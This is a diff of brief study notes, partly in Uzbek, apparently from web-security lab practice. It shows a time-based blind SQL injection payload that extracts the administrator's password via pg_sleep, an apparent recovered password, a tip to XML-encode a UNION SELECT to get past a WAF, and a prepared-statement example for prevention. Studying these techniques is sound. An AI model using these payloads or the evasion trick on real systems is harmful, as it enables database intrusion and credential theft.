@@ -2,3 +2,11 @@
 '%3bSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
 jadexxi11celncib65c7  BLIND TIME BASED
 id orqali topilgan sqli dan foydalanishda UNION SELECT username || '~' || password FROM users buni WAF tutib olishi mumkin shuning uchun buni xml encodelash kerak
+
+
+SQLI oldini olishni eng samarali usuli 
+
+
+PreparedStatement statement = connection.prepareStatement("SELECT * FROM products WHERE category = ?");
+statement.setString(1, input);
+ResultSet resultSet = statement.executeQuery();
